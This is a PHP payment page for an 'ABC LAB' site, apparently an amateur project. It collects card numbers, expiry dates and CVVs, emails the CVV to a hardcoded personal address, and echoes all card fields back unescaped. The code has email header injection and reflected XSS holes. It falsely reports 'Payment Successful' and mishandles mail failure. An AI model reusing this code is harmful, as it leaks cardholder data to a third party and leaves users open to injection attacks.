<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ABC LAB</title>
    <link rel="stylesheet" href="css/reg.css">
</head>
<body>


<nav>
      <input type="checkbox" id="check">
      <label for="check" class="checkbtn">
        <i class="fas fa-bars"></i>
      </label>
      <label class="logo">WELCOME ABC LAB</label>
      <ul>
        <li><a  href="user.php">Home</a></li>
        <li><a href="date.php">patient details</a></li>
        <li><a href="payment.php">Payment</a></li>
        <li><a href="#">Contact</a></li>
        <li><a href="#">Feedback</a></li>
      </ul>
    </nav>




<div class="container">

<?php
// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $name = $_POST["name"];
    $email = $_POST["email"];
    $credit_card = $_POST["credit_card"];
    $expiry_date = $_POST["expiry_date"];
    $cvv = $_POST["cvv"];
    

    $to ="ronaldantony52@gmail.com";
    
    $headers = "from $email";

    if(mail($to,$name,$cvv,$headers)){
        echo "email sent Succesfully";
    }else{
        echo"Recipt sent your email";
    }
    
    // Process payment - This is where you would integrate with a payment gateway
    // For demonstration purposes, we'll simply output the data
    echo "<h2>Payment Successful</h2>";
    echo "<p>Name: $name</p>";
    echo "<p>Email: $email</p>";
    echo "<p>Credit Card: $credit_card</p>";
    echo "<p>Expiry Date: $expiry_date</p>";
    echo "<p>CVV: $cvv</p>";
} else {
    // Redirect to the billing and payment form if accessed directly without submission
    header("Location: billing_payment_form.html");
    exit();
}
?>

</div>






</body>
</html>